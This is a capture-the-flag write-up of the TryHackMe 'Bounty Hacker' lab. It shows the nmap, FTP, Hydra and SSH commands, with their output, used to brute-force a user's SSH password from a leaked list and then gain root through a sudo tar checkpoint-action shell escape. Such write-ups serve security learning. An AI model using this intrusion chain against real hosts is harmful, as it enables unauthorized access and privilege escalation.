# Bounty Hacker

TryHackMe room link : [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)

## Nmap

`nmap -T 4 -sV 10.10.38.76`

```

Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 14:17 EDT
Nmap scan report for 10.10.38.76
Host is up (0.22s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.72 seconds
```

## FTP

lets try anonymous login in ftp

`ftp 10.10.38.76`

```

Connected to 10.10.38.76.
220 (vsFTPd 3.0.3)
Name (10.10.38.76:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.

ftp> get locks.txt
local:locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.00 secs (2.9749 MB/s)

ftp> get task.txt
local:task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (77.7591 kB/s)
```

lets read task.txt

```

1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
lets read locks.txt

**`locks.txt` seems to be containing list of passwords, lets try it to gain ssh access for `lin`**

## Hydra

`hydra -l lin -P locks.txt 10.10.38.76 ssh`

```

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-26 15:10:40
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.38.76:22/

[22][ssh] host: 10.10.38.76   login: lin   password: *****************

1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-26 15:10:56
```

lets use above credentials to gain ssh access

## SSH

`ssh lin@10.10.38.76`

```

The authenticity of host '10.10.38.76 (10.10.38.76)' can't be established.
ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.38.76' (ECDSA) to the list of known hosts.
lin@10.10.38.76's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
```

```

lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
*********************
```
lets check for sudo permission that lin have

`sudo -l`

```

Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

__use GTFOBins to search for tar__

## Privilege Escalation

```

lin@bountyhacker:/$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
******************
# 
```
